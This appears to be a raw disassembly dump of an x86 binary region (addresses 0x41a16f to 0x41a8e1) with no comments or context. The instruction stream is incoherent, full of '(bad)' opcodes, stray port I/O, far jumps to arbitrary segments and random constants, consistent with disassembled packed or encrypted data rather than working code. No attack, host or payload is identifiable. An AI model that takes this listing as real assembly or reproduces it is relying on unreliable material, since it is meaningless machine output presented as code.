  41a16f:	mov    edx,0xa58392d1
  41a174:	(bad)  
  41a175:	push   cs
  41a176:	cmp    eax,0x69ce8b28
  41a17b:	inc    ebp
  41a17c:	ficomp DWORD PTR [edx*8-0x22352d15]
  41a183:	stc    
  41a184:	xchg   ebx,eax
  41a185:	inc    esi
  41a186:	loop   0x41a158
  41a188:	xor    BYTE PTR [esi],dh
  41a18a:	lods   eax,DWORD PTR ds:[esi]
  41a18b:	xchg   edx,eax
  41a18c:	aaa    
  41a18d:	pop    ecx
  41a18e:	and    eax,0x24bb53d5
  41a193:	push   0xcf58e6bb
  41a198:	aas    
  41a199:	push   es
  41a19a:	add    BYTE PTR [edx+0x1d25a61],ah
  41a1a0:	jns    0x41a1c6
  41a1a2:	into   
  41a1a3:	xlat   BYTE PTR ds:[ebx]
  41a1a4:	pop    ecx
  41a1a5:	punpcklwd mm1,mm4
  41a1a8:	inc    edi
  41a1a9:	scas   al,BYTE PTR es:[edi]
  41a1aa:	mov    ebx,0xe9afa67c
  41a1af:	sahf   
  41a1b0:	sub    al,0xb2
  41a1b2:	and    DWORD PTR [ecx+0x552f78a1],0xae0da541
  41a1bc:	sub    al,0xcc
  41a1be:	cs jp  0x41a1a8
  41a1c1:	popa   
  41a1c2:	mov    cl,0xb5
  41a1c4:	scas   eax,DWORD PTR es:[edi]
  41a1c5:	scas   eax,DWORD PTR es:[edi]
  41a1c6:	rcr    ecx,0x19
  41a1c9:	push   esi
  41a1ca:	push   es
  41a1cb:	pop    ebx
  41a1cc:	sbb    esp,DWORD PTR [edi]
  41a1ce:	pop    ecx
  41a1cf:	icebp  
  41a1d0:	push   ds
  41a1d1:	(bad)  
  41a1d2:	leave  
  41a1d3:	sahf   
  41a1d4:	add    esp,ebp
  41a1d6:	mov    bl,0x6a
  41a1d8:	es or  eax,0x96a2d51b
  41a1de:	xchg   ebx,eax
  41a1df:	push   es
  41a1e0:	or     al,0xb4
  41a1e2:	call   0xedf45b69
  41a1e7:	jae    0x41a23a
  41a1e9:	sahf   
  41a1ea:	ins    BYTE PTR es:[edi],dx
  41a1eb:	dec    edx
  41a1ec:	test   ecx,edx
  41a1ee:	test   DWORD PTR [edx+0x65],0xd4c7e7c
  41a1f5:	jo     0x41a250
  41a1f7:	loop   0x41a1a0
  41a1f9:	xchg   esi,eax
  41a1fa:	stc    
  41a1fb:	or     al,0x7
  41a1fd:	push   edi
  41a1fe:	cs std 
  41a200:	sbb    ebp,0x4eb404c9
  41a206:	dec    ecx
  41a207:	mov    cx,0xe819
  41a20b:	in     eax,dx
  41a20c:	or     DWORD PTR [eax+0x43b70083],esp
  41a212:	cmp    DWORD PTR [eax+0x2f359838],edx
  41a218:	shl    BYTE PTR [edi-0x1ddac0e5],1
  41a21e:	shl    DWORD PTR [eax+ebp*8-0x77],cl
  41a222:	sub    esi,DWORD PTR [esi]
  41a224:	out    dx,al
  41a225:	(bad)  
  41a226:	fimul  WORD PTR [edx+0x53]
  41a229:	adc    eax,0x69eaaaae
  41a22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a22f:	test   bh,cl
  41a231:	sbb    ebp,DWORD PTR [esi]
  41a233:	(bad)  
  41a235:	aas    
  41a236:	mov    dl,0xb
  41a238:	retf   
  41a239:	pop    ss
  41a23a:	sub    BYTE PTR [ebp+0x4b4f6d13],0x3c
  41a241:	mov    ah,0x30
  41a243:	jp     0x41a1c6
  41a245:	push   esi
  41a246:	mov    edi,0x4225d01d
  41a24b:	or     BYTE PTR [edi-0x529d50f1],ah
  41a251:	repnz xor esp,edi
  41a254:	aam    0xa5
  41a256:	push   esp
  41a257:	jmp    0xd1f3b870
  41a25c:	lock pxor mm5,QWORD PTR [eax]
  41a260:	xchg   esi,eax
  41a261:	mov    cl,0x65
  41a263:	mov    ebp,0x3c9608b8
  41a268:	out    0x63,eax
  41a26a:	xchg   edx,eax
  41a26b:	fsub   st,st(6)
  41a26d:	fwait
  41a26e:	xchg   ecx,eax
  41a26f:	and    esp,ebp
  41a271:	ja     0x41a1fd
  41a273:	jmp    0x6d06:0xb50a904d
  41a27a:	push   0xb9ad6456
  41a27f:	aas    
  41a280:	and    eax,0xfa53ab9
  41a285:	jle    0x41a293
  41a287:	pop    ebp
  41a288:	push   esp
  41a289:	nop
  41a28a:	adc    edi,0xffffff88
  41a28d:	fnstenv ds:0x33359f39
  41a293:	pop    esi
  41a294:	cli    
  41a295:	aaa    
  41a296:	jbe    0x41a2d7
  41a298:	mov    al,ds:0x2efc1a99
  41a29d:	mov    ch,0x1a
  41a29f:	jp     0x41a256
  41a2a1:	loop   0x41a245
  41a2a3:	dec    ebp
  41a2a4:	pop    edi
  41a2a5:	add    bl,BYTE PTR [eax-0x50]
  41a2a8:	repz popa 
  41a2aa:	clc    
  41a2ab:	imul   edi,edi,0xe62ffb59
  41a2b1:	(bad)  
  41a2b2:	push   ebx
  41a2b3:	jbe    0x41a30f
  41a2b5:	inc    ebp
  41a2b6:	lods   eax,DWORD PTR ds:[esi]
  41a2b7:	push   esi
  41a2b8:	pop    ebx
  41a2b9:	imul   esp,DWORD PTR [eax],0xffffffc4
  41a2bc:	sbb    BYTE PTR ds:0xe2f0d6c2,bl
  41a2c2:	jns    0x41a30d
  41a2c4:	or     al,BYTE PTR [ebx+ebp*2]
  41a2c7:	ins    BYTE PTR es:[edi],dx
  41a2c8:	ins    DWORD PTR es:[edi],dx
  41a2c9:	push   0xffffff89
  41a2cb:	or     DWORD PTR [edx],esp
  41a2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ce:	ins    BYTE PTR es:[edi],dx
  41a2cf:	les    esi,FWORD PTR [eax]
  41a2d1:	mov    ch,0xf5
  41a2d3:	popf   
  41a2d4:	call   0xfc67:0xc96f283e
  41a2db:	scas   al,BYTE PTR es:[edi]
  41a2dc:	cmp    al,0x55
  41a2de:	xor    ch,BYTE PTR [esi-0x4b2e05a8]
  41a2e4:	cmp    BYTE PTR [esi],dh
  41a2e6:	mov    al,ds:0x123c41b4
  41a2eb:	sub    bh,BYTE PTR ss:[ecx+0x705a56dc]
  41a2f2:	mov    ds:0x2b93c81b,eax
  41a2f7:	push   ebp
  41a2f8:	pushf  
  41a2f9:	or     DWORD PTR [esp+eax*2+0x47],edx
  41a2fd:	iret   
  41a2fe:	test   BYTE PTR [esi],bh
  41a300:	inc    edi
  41a301:	adc    esi,DWORD PTR [edi]
  41a303:	imul   esi,DWORD PTR [ecx-0x5a0829db],0x23b1ae14
  41a30d:	fsubrp st(4),st
  41a30f:	hlt    
  41a310:	xor    BYTE PTR [esi],ah
  41a312:	inc    ecx
  41a313:	jno    0x41a34a
  41a315:	(bad)  
  41a316:	mov    al,0xb2
  41a318:	(bad)  
  41a319:	iret   
  41a31a:	push   edx
  41a31b:	out    0xa,al
  41a31d:	cmp    BYTE PTR [edx+0x548115b5],bl
  41a323:	addr16 iret 
  41a325:	sti    
  41a326:	in     eax,dx
  41a327:	add    DWORD PTR [ebx],esp
  41a329:	test   eax,0x1d1f800b
  41a32e:	retf   0x93b5
  41a331:	shl    DWORD PTR [eax-0x44],cl
  41a334:	xchg   esi,eax
  41a335:	sbb    DWORD PTR [edi+esi*1+0x4af856e2],esp
  41a33c:	in     eax,0xfc
  41a33e:	xchg   edx,eax
  41a33f:	add    dl,BYTE PTR [ebp-0x6078d2d7]
  41a345:	mov    cl,0x6
  41a347:	pop    esp
  41a348:	mov    ch,BYTE PTR [edx]
  41a34a:	push   ss
  41a34b:	mov    al,ds:0x74185f95
  41a350:	mov    ah,0xae
  41a352:	mov    al,0x75
  41a354:	mov    al,0x58
  41a356:	or     eax,0x4c6add23
  41a35b:	sub    ebp,DWORD PTR [eax+ebp*4+0x52f7abe5]
  41a362:	lahf   
  41a363:	push   ss
  41a364:	ins    DWORD PTR es:[edi],dx
  41a365:	mov    WORD PTR [ecx-0x76],ds
  41a368:	adc    al,0xb6
  41a36a:	(bad)  [ebx]
  41a36c:	hlt    
  41a36d:	push   es
  41a36e:	cmp    BYTE PTR [edx+0x65d0c8aa],0x28
  41a375:	out    0xf6,al
  41a377:	dec    ecx
  41a378:	data16 stos BYTE PTR es:[edi],al
  41a37a:	lea    ebx,[ebx-0x72a474c0]
  41a380:	bnd call 0x23c094af
  41a386:	out    0x76,eax
  41a388:	call   0x5512d22b
  41a38d:	jmp    0xa01ab53
  41a392:	out    0x87,eax
  41a394:	stos   DWORD PTR es:[edi],eax
  41a395:	jns    0x41a38a
  41a397:	push   0xfb576e8a
  41a39c:	not    BYTE PTR [eax+0x549f0516]
  41a3a2:	add    dl,bl
  41a3a4:	rol    DWORD PTR [ebp+0x4d95c6e8],1
  41a3aa:	dec    DWORD PTR ds:0x35082641
  41a3b0:	and    al,0xa6
  41a3b2:	in     al,0xd7
  41a3b4:	stos   DWORD PTR es:[edi],eax
  41a3b5:	mov    esi,DWORD PTR [edx-0xf]
  41a3b8:	jp     0x41a38e
  41a3ba:	lahf   
  41a3bb:	mov    ah,0x90
  41a3bd:	mov    cl,0xb0
  41a3bf:	lds    esp,FWORD PTR [edx]
  41a3c1:	jecxz  0x41a37f
  41a3c3:	sub    al,al
  41a3c5:	cli    
  41a3c6:	xlat   BYTE PTR ds:[ebx]
  41a3c7:	int    0xe8
  41a3c9:	lea    eax,[edi-0x1f2b8adf]
  41a3cf:	pop    eax
  41a3d0:	je     0x41a382
  41a3d2:	sbb    ch,BYTE PTR [ecx+0x49c4ed54]
  41a3d8:	sub    ebx,DWORD PTR ds:0x657a3be5
  41a3de:	fidivr DWORD PTR [esi]
  41a3e0:	cli    
  41a3e1:	loopne 0x41a3f2
  41a3e3:	xchg   esi,eax
  41a3e4:	imul   esi,DWORD PTR [esi-0x44b919b4],0x42
  41a3eb:	jecxz  0x41a3d0
  41a3ed:	sti    
  41a3ee:	bnd jge 0x41a380
  41a3f1:	and    DWORD PTR [ecx+edi*2+0x74],ebp
  41a3f5:	mov    WORD PTR [ebp-0x36],fs
  41a3f8:	cwde   
  41a3f9:	out    0xc8,eax
  41a3fb:	and    al,0xad
  41a3fd:	loopne 0x41a450
  41a3ff:	mov    bl,0x87
  41a401:	add    DWORD PTR ds:0x95e94886,eax
  41a407:	ret    
  41a408:	jle    0x41a38c
  41a40a:	lds    esp,FWORD PTR [ebp-0x15]
  41a40d:	inc    ebp
  41a40e:	ins    BYTE PTR es:[edi],dx
  41a40f:	xchg   edi,eax
  41a410:	jo     0x41a3ee
  41a412:	scas   eax,DWORD PTR es:[edi]
  41a413:	mov    DWORD PTR [edx-0x3104b47d],esp
  41a419:	mov    ch,0xcc
  41a41b:	cmp    bh,0xd4
  41a41e:	retf   
  41a41f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a420:	push   cs
  41a421:	int    0x33
  41a423:	sub    al,0x1f
  41a425:	pop    edx
  41a426:	call   0x1a534824
  41a42b:	mov    ecx,0xa2234808
  41a430:	and    dl,0x91
  41a433:	sub    eax,0x5d6d9680
  41a438:	imul   esi,DWORD PTR [ebp-0x2c],0x21
  41a43c:	xor    edi,DWORD PTR [ecx+0x4c]
  41a43f:	pop    ebp
  41a440:	test   BYTE PTR [edx+0x37],bl
  41a443:	outs   dx,DWORD PTR ds:[esi]
  41a444:	test   BYTE PTR [ebp-0x15f3c8bf],ah
  41a44a:	jl     0x41a418
  41a44c:	or     DWORD PTR [ebx],esp
  41a44e:	mov    dh,0xf
  41a450:	jge    0x41a4c1
  41a452:	inc    esi
  41a453:	ja     0x41a48a
  41a455:	repnz cmc 
  41a457:	mov    cl,0x65
  41a459:	mov    BYTE PTR [edx-0x2a3de751],cl
  41a45f:	in     eax,0xb
  41a461:	in     al,0xef
  41a463:	je     0x41a44f
  41a465:	movntps XMMWORD PTR [edx-0x41],xmm1
  41a469:	mov    bh,0x16
  41a46b:	pop    es
  41a46c:	and    dl,BYTE PTR [esi+eiz*8]
  41a46f:	fcmovne st,st(1)
  41a471:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41a473:	dec    ebx
  41a474:	rcl    dh,1
  41a476:	xchg   DWORD PTR [edx],esp
  41a478:	push   ds
  41a479:	icebp  
  41a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47b:	enter  0x234b,0xfc
  41a47f:	and    bl,0xd
  41a482:	inc    esp
  41a483:	sub    dl,BYTE PTR [esp+ebx*1+0x354be058]
  41a48a:	jle    0x41a424
  41a48c:	and    al,0x1
  41a48e:	icebp  
  41a48f:	in     eax,0x87
  41a491:	sub    edx,DWORD PTR [ecx-0x6a]
  41a494:	push   esi
  41a495:	jo     0x41a45c
  41a497:	repnz out 0xa9,al
  41a49a:	mov    ecx,0x216c2fde
  41a49f:	sbb    cl,dl
  41a4a1:	je     0x41a4a9
  41a4a3:	jmp    0x41a51c
  41a4a5:	sub    al,BYTE PTR [eax+0x3ee148c5]
  41a4ab:	daa    
  41a4ac:	in     al,dx
  41a4ad:	xchg   edi,eax
  41a4ae:	and    cl,BYTE PTR [ebx-0x1c7c7a17]
  41a4b4:	pop    es
  41a4b5:	in     eax,0xb3
  41a4b7:	jno    0x41a4a1
  41a4b9:	sar    BYTE PTR [edx-0xcdaa11a],1
  41a4bf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4c1:	cli    
  41a4c2:	mov    edi,0xff8292fb
  41a4c7:	push   edx
  41a4c8:	mov    esi,ebp
  41a4ca:	enter  0xb592,0xf1
  41a4ce:	dec    ebp
  41a4cf:	cmp    eax,0xb2791a09
  41a4d4:	mov    eax,ds:0xc72c78c1
  41a4d9:	mov    ds:0xa7ae07c7,al
  41a4de:	fild   QWORD PTR [eax-0x63145409]
  41a4e4:	cwde   
  41a4e5:	pop    esi
  41a4e6:	dec    esi
  41a4e7:	dec    edi
  41a4e8:	mov    dh,0x1b
  41a4ea:	sbb    DWORD PTR [ebx+0x583d7a0d],ebx
  41a4f0:	iret   
  41a4f1:	js     0x41a559
  41a4f3:	fcom   QWORD PTR [eax-0x6]
  41a4f6:	scas   al,BYTE PTR es:[edi]
  41a4f7:	in     al,0x74
  41a4f9:	sbb    al,0x9b
  41a4fb:	mov    cl,0x7
  41a4fd:	stos   BYTE PTR es:[edi],al
  41a4fe:	into   
  41a4ff:	mov    ebp,DWORD PTR [eax+0x3449cfd1]
  41a505:	loop   0x41a4f6
  41a507:	aas    
  41a508:	jno    0x41a529
  41a50a:	or     al,0xa1
  41a50c:	adc    eax,0x745603f4
  41a511:	fmul   QWORD PTR [eax+0x330fb59f]
  41a517:	adc    al,0x91
  41a519:	enter  0x28d1,0x87
  41a51d:	dec    edx
  41a51e:	inc    ebx
  41a51f:	cdq    
  41a520:	daa    
  41a521:	mov    esi,0x3796f6ce
  41a526:	mov    ebx,0xf708f552
  41a52b:	jp     0x41a536
  41a52d:	pop    edi
  41a52e:	jmp    0x41a4dd
  41a530:	or     eax,0x677d79a3
  41a535:	add    dh,BYTE PTR [edx+0x49]
  41a538:	in     al,dx
  41a539:	push   eax
  41a53a:	push   0x9f19f018
  41a53f:	in     al,dx
  41a540:	rcl    BYTE PTR [ebx+esi*2],0xbc
  41a544:	mov    ecx,0x8ccfc913
  41a549:	outs   dx,BYTE PTR ds:[esi]
  41a54a:	inc    edi
  41a54b:	je     0x41a4cd
  41a54d:	pop    ss
  41a54e:	sbb    eax,DWORD PTR [esi+0x7bfa9715]
  41a554:	jbe    0x41a4f8
  41a556:	clc    
  41a557:	ja     0x41a578
  41a559:	mov    bl,0x35
  41a55b:	(bad)  
  41a55c:	das    
  41a55d:	rcr    ebx,0xde
  41a560:	xor    eax,0x5dcd86e3
  41a565:	arpl   di,bx
  41a567:	pushf  
  41a568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a569:	push   0x19
  41a56b:	jno    0x41a583
  41a56d:	ss cmp eax,esi
  41a570:	inc    ebx
  41a571:	lods   al,BYTE PTR ds:[esi]
  41a572:	cdq    
  41a573:	int    0xda
  41a575:	es xchg esp,eax
  41a577:	out    0x15,al
  41a579:	cld    
  41a57a:	pushf  
  41a57b:	xchg   BYTE PTR [ebp+0x19],dl
  41a57e:	add    DWORD PTR [ebx],eax
  41a580:	mov    dh,0x19
  41a582:	out    0x92,eax
  41a584:	jbe    0x41a5c9
  41a586:	adc    eax,0xb7581cae
  41a58b:	jno    0x41a54c
  41a58d:	loope  0x41a54c
  41a58f:	sub    dl,BYTE PTR [ebx+0x26]
  41a592:	mov    bl,0x77
  41a594:	aam    0x1b
  41a596:	fmul   DWORD PTR [ecx]
  41a598:	fdiv   st,st(3)
  41a59a:	add    al,0x65
  41a59c:	sbb    eax,0x59ca42c0
  41a5a1:	jl     0x41a592
  41a5a3:	test   eax,0x25a869aa
  41a5a8:	add    BYTE PTR [ecx],ch
  41a5aa:	test   DWORD PTR [eax],edx
  41a5ac:	xor    BYTE PTR [ecx],0xb4
  41a5af:	push   esp
  41a5b0:	push   ebx
  41a5b1:	ds sahf 
  41a5b3:	mov    BYTE PTR [eax+ebx*8],0x4c
  41a5b7:	sahf   
  41a5b8:	loop   0x41a5f8
  41a5ba:	or     ch,BYTE PTR [eax]
  41a5bc:	ss aad 0xd3
  41a5bf:	(bad)  
  41a5c0:	and    eax,0x3b16e665
  41a5c5:	jbe    0x41a630
  41a5c7:	inc    eax
  41a5c8:	mov    BYTE PTR [ebx+0x5c5ef25],dl
  41a5ce:	clc    
  41a5cf:	aaa    
  41a5d0:	and    dh,BYTE PTR [eax-0x409ebd9b]
  41a5d6:	out    dx,al
  41a5d7:	cmp    esp,esp
  41a5d9:	push   es
  41a5da:	mov    bh,0x75
  41a5dc:	xor    BYTE PTR [edx-0xdff9a51],0x7c
  41a5e3:	push   edi
  41a5e4:	jb     0x41a591
  41a5e6:	dec    ebx
  41a5e7:	mov    eax,ds:0x750e67bd
  41a5ec:	mov    bh,0x1e
  41a5ee:	jg     0x41a594
  41a5f0:	sub    ebp,DWORD PTR [edx]
  41a5f2:	push   ebp
  41a5f3:	pop    ecx
  41a5f4:	pop    ecx
  41a5f5:	xchg   ebp,eax
  41a5f6:	jle    0x41a5ae
  41a5f8:	es push ebx
  41a5fa:	clc    
  41a5fb:	sar    DWORD PTR [ecx-0x357e56bb],cl
  41a601:	pop    edi
  41a602:	aad    0x4d
  41a604:	inc    ecx
  41a605:	sub    cl,cl
  41a607:	push   ebp
  41a608:	jmp    0xc6d1:0x6e9b35a3
  41a60f:	push   0x1c4d1f61
  41a614:	push   0xbeef3db8
  41a619:	addr16 out 0x2f,eax
  41a61c:	call   0xae57:0xa13f6ab6
  41a623:	outs   dx,BYTE PTR ds:[esi]
  41a624:	jmp    0x1553:0x3c83711
  41a62b:	lods   eax,DWORD PTR ds:[esi]
  41a62c:	pop    ebx
  41a62d:	jp     0x41a690
  41a62f:	mov    WORD PTR [esi-0x77],gs
  41a632:	rcl    DWORD PTR [esi-0x3b91873b],cl
  41a638:	sar    DWORD PTR [edi],cl
  41a63a:	and    eax,0x9695a854
  41a63f:	popa   
  41a640:	icebp  
  41a641:	sbb    BYTE PTR [esp+eax*1],cl
  41a644:	mov    bh,0x65
  41a646:	fcmovne st,st(1)
  41a648:	xchg   edi,eax
  41a649:	xchg   ecx,eax
  41a64a:	lds    edx,FWORD PTR [ebx+edi*8]
  41a64d:	xlat   BYTE PTR ds:[ebx]
  41a64e:	mov    ch,0xb0
  41a650:	retf   0xf787
  41a653:	jo     0x41a6d4
  41a655:	mov    WORD PTR [eax],fs
  41a657:	call   0x8296bcb7
  41a65c:	inc    edx
  41a65d:	dec    ebx
  41a65e:	and    ebp,DWORD PTR [esi]
  41a660:	(bad)  
  41a661:	(bad)  
  41a662:	cmp    DWORD PTR [ebx+0x63c1ef48],esi
  41a668:	dec    ecx
  41a669:	call   0x5064:0xb3ef5377
  41a670:	xor    ch,BYTE PTR [esi+0x4c]
  41a673:	dec    esi
  41a674:	gs pop ss
  41a676:	xchg   esi,eax
  41a677:	imul   esi,DWORD PTR [ebx],0x75716496
  41a67d:	(bad)  
  41a67e:	xor    BYTE PTR [ebx+0x5b],ch
  41a681:	(bad)  
  41a682:	and    edx,eax
  41a684:	test   esp,edi
  41a686:	mov    ch,BYTE PTR [ebx+edi*1-0x236fa2d]
  41a68d:	pusha  
  41a68e:	cvtpi2ps xmm2,mm7
  41a691:	stos   BYTE PTR es:[edi],al
  41a692:	dec    ebp
  41a693:	adc    eax,0xe4550b2a
  41a698:	mov    esp,?
  41a69a:	mov    ds,WORD PTR ds:0xad8bf69
  41a6a0:	mov    BYTE PTR [ebp+eax*8-0x31248284],bh
  41a6a7:	mov    dl,0x5f
  41a6a9:	jae    0x41a6e7
  41a6ab:	jbe    0x41a6d9
  41a6ad:	cld    
  41a6ae:	xchg   ebx,eax
  41a6af:	icebp  
  41a6b0:	(bad)  
  41a6b1:	iret   
  41a6b2:	cli    
  41a6b3:	and    dl,BYTE PTR [esi+0x52]
  41a6b6:	pusha  
  41a6b7:	xchg   WORD PTR [ebp+0x54],di
  41a6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6bc:	jns    0x41a65a
  41a6be:	jge    0x41a6a8
  41a6c0:	outs   dx,BYTE PTR ds:[esi]
  41a6c1:	xchg   ebx,eax
  41a6c2:	sub    BYTE PTR [esi+ebx*8+0x48],0x99
  41a6c7:	mov    gs,eax
  41a6c9:	paddsb mm6,mm1
  41a6cc:	mov    edi,0x3167a326
  41a6d1:	adc    ebp,DWORD PTR [edi]
  41a6d3:	jae    0x41a718
  41a6d5:	mov    dh,0xf1
  41a6d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6d8:	add    BYTE PTR ds:0x9caaf772,0x86
  41a6df:	js     0x41a6d6
  41a6e1:	adc    BYTE PTR ds:0x8402283d,bl
  41a6e7:	ja     0x41a67a
  41a6e9:	mov    esp,0x9e49a1ea
  41a6ee:	icebp  
  41a6ef:	adc    eax,0xd59814fd
  41a6f4:	dec    ecx
  41a6f5:	lahf   
  41a6f6:	add    eax,DWORD PTR [edx]
  41a6f8:	mov    ah,BYTE PTR [esi]
  41a6fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6fb:	xor    eax,0x687a972e
  41a700:	add    al,BYTE PTR [ecx-0x4d493047]
  41a706:	cmovns edx,ebx
  41a709:	ja     0x41a6b5
  41a70b:	js     0x41a781
  41a70d:	ja     0x41a761
  41a70f:	add    BYTE PTR [esi],dl
  41a711:	mov    esp,0x783ace33
  41a716:	in     al,dx
  41a717:	jb     0x41a712
  41a719:	inc    edx
  41a71a:	imul   ecx,eax,0x2a
  41a71d:	rol    edi,0x60
  41a720:	push   ebx
  41a721:	add    ebx,ecx
  41a723:	jmp    0x70af:0xe6e5d4ac
  41a72a:	shr    DWORD PTR [eax+0x53dec79f],0x8d
  41a731:	and    bl,dl
  41a733:	xor    BYTE PTR [ecx+0x23291ebb],al
  41a739:	xor    al,0x60
  41a73b:	and    bh,BYTE PTR [edx-0x42]
  41a73e:	rcr    DWORD PTR [edi-0x44],0x3d
  41a742:	inc    edi
  41a743:	call   0xab68fd39
  41a748:	daa    
  41a749:	jle    0x41a76f
  41a74b:	mov    bh,0x25
  41a74d:	dec    esp
  41a74e:	cmp    DWORD PTR [ebp+0x5b],ecx
  41a751:	into   
  41a752:	and    al,BYTE PTR [ecx+0x50781362]
  41a758:	and    al,BYTE PTR [eax+ebp*2+0x3ead0ace]
  41a75f:	int    0x43
  41a761:	push   0xffffffb4
  41a763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a764:	pop    ss
  41a765:	sub    BYTE PTR ds:0x40ac1fae,cl
  41a76b:	or     DWORD PTR [eax+0x31],eax
  41a76e:	jmp    0xfeb1:0x74db0cdc
  41a775:	in     eax,0x17
  41a777:	jp     0x41a72b
  41a779:	jge    0x41a788
  41a77b:	mov    cl,0xf7
  41a77d:	mov    ecx,DWORD PTR [edx]
  41a77f:	cmp    DWORD PTR [edi+0x56e80731],0xffffff8f
  41a786:	stos   BYTE PTR es:[edi],al
  41a787:	cdq    
  41a788:	popf   
  41a789:	jbe    0x41a727
  41a78b:	mov    edx,0xccf47567
  41a790:	retf   0x5ab
  41a793:	shl    DWORD PTR [ebx],1
  41a795:	ss jns 0x41a810
  41a798:	pop    ebp
  41a799:	sbb    al,0x3f
  41a79b:	sbb    BYTE PTR [esi+edx*2-0x73],dl
  41a79f:	adc    eax,0x12aaeffe
  41a7a4:	lock jg 0x41a818
  41a7a7:	clc    
  41a7a8:	jne    0x41a739
  41a7aa:	test   DWORD PTR [edx],edi
  41a7ac:	and    al,0x96
  41a7ae:	stos   BYTE PTR es:[edi],al
  41a7af:	cmp    DWORD PTR [edi+0x654e9a54],edi
  41a7b5:	cmp    al,BYTE PTR [edi-0x60925410]
  41a7bb:	retf   0x847f
  41a7be:	inc    ebp
  41a7bf:	loope  0x41a833
  41a7c1:	push   ss
  41a7c2:	lds    edx,FWORD PTR [eax-0x5]
  41a7c5:	(bad)  
  41a7c6:	mov    ds:0xbd849dda,eax
  41a7cb:	hlt    
  41a7cc:	mov    dl,0xc5
  41a7ce:	xchg   esi,eax
  41a7cf:	mov    esi,0xc37ec2b1
  41a7d4:	test   al,0xbf
  41a7d6:	dec    edx
  41a7d7:	loope  0x41a775
  41a7d9:	aad    0x73
  41a7db:	xor    BYTE PTR [eax+0x4903c667],0xd
  41a7e2:	jge    0x41a810
  41a7e4:	pusha  
  41a7e5:	add    eax,0x2a13f571
  41a7ea:	xor    al,0x46
  41a7ec:	dec    ebx
  41a7ed:	out    0x1f,al
  41a7ef:	sub    al,0xf
  41a7f1:	test   DWORD PTR [ebp+0x78],ebp
  41a7f4:	fnsave [ecx]
  41a7f6:	mov    edx,0x723c44b5
  41a7fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7fc:	sar    DWORD PTR [ecx+0x6c],1
  41a7ff:	jmp    0x4ccb6270
  41a804:	loop   0x41a85e
  41a806:	pop    ebp
  41a807:	les    esp,FWORD PTR [esi+edi*4+0x43]
  41a80b:	push   edx
  41a80c:	mov    cl,BYTE PTR [esi-0x41a5c191]
  41a812:	jge    0x41a810
  41a814:	jo     0x41a870
  41a816:	test   eax,0x450b2830
  41a81b:	jbe    0x41a830
  41a81d:	out    dx,al
  41a81e:	ins    DWORD PTR es:[edi],dx
  41a81f:	or     al,0x3b
  41a821:	mov    ebp,0x95b6ef06
  41a826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a827:	sbb    eax,0xd694c574
  41a82c:	add    BYTE PTR ds:0x41cadb49,dh
  41a832:	dec    ecx
  41a833:	hlt    
  41a834:	xor    bh,ah
  41a836:	inc    ebx
  41a837:	xchg   esi,eax
  41a838:	div    DWORD PTR [esi-0x7ba47510]
  41a83e:	outs   dx,DWORD PTR ds:[esi]
  41a83f:	pop    ebx
  41a840:	int3   
  41a841:	lods   eax,DWORD PTR ds:[esi]
  41a842:	sub    esp,0xffffffe8
  41a845:	retf   0xdd3e
  41a848:	movups XMMWORD PTR [eax+0x40],xmm0
  41a84c:	std    
  41a84d:	and    ah,cl
  41a84f:	xor    BYTE PTR [ebx+0x53],cl
  41a852:	addr16 daa 
  41a854:	hlt    
  41a855:	jae    0x41a8c1
  41a857:	adc    BYTE PTR [esi-0x40],al
  41a85a:	sub    DWORD PTR [ebx-0x55],eax
  41a85d:	xor    BYTE PTR [esi+0x767b3861],cl
  41a863:	push   edx
  41a864:	in     eax,dx
  41a865:	je     0x41a849
  41a867:	stc    
  41a868:	dec    ecx
  41a869:	repz cdq 
  41a86b:	jg     0x41a878
  41a86d:	and    al,0x31
  41a86f:	fwait
  41a870:	mov    ebp,DWORD PTR [ecx+0x29d6b59]
  41a876:	push   cs
  41a877:	jg     0x41a899
  41a879:	stc    
  41a87a:	rcr    DWORD PTR [eax],1
  41a87c:	ffreep st(7)
  41a87e:	sbb    cl,bl
  41a880:	mov    ebp,0x8d53d080
  41a885:	out    dx,al
  41a886:	mov    eax,ds:0xd25058ae
  41a88b:	xchg   ebp,eax
  41a88c:	push   eax
  41a88d:	cmc    
  41a88e:	das    
  41a88f:	and    esp,ebx
  41a891:	lock or al,0xd
  41a894:	add    al,BYTE PTR [ebx-0x3f]
  41a897:	or     DWORD PTR [ebp+esi*1+0x44],esp
  41a89b:	cmp    BYTE PTR [ecx+edi*4-0x26779aa0],al
  41a8a2:	outs   dx,BYTE PTR ds:[esi]
  41a8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8a4:	jmp    0x6e196f34
  41a8a9:	pop    ds
  41a8aa:	cmp    BYTE PTR [edx],ch
  41a8ac:	push   ds
  41a8ad:	xchg   edi,eax
  41a8ae:	lods   al,BYTE PTR ds:[esi]
  41a8af:	inc    ecx
  41a8b0:	sbb    ebp,esp
  41a8b2:	add    eax,DWORD PTR [ebx+0xe]
  41a8b5:	mov    BYTE PTR ds:0xf1c093c8,bl
  41a8bb:	xchg   ecx,eax
  41a8bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8bd:	lods   al,BYTE PTR ds:[esi]
  41a8be:	cmp    DWORD PTR [eax+esi*8-0x3],esp
  41a8c2:	jle    0x41a943
  41a8c4:	ds fmul st(1),st
  41a8c7:	sbb    bl,bh
  41a8c9:	dec    edx
  41a8ca:	ror    DWORD PTR [esi+0x5056dfd8],0x1e
  41a8d1:	and    ah,bl
  41a8d3:	(bad)  
  41a8d4:	cmp    BYTE PTR [eax-0x752344f4],dl
  41a8da:	xchg   edx,eax
  41a8db:	inc    ebp
  41a8dc:	test   eax,0x81750881
  41a8e1:	pop    eax
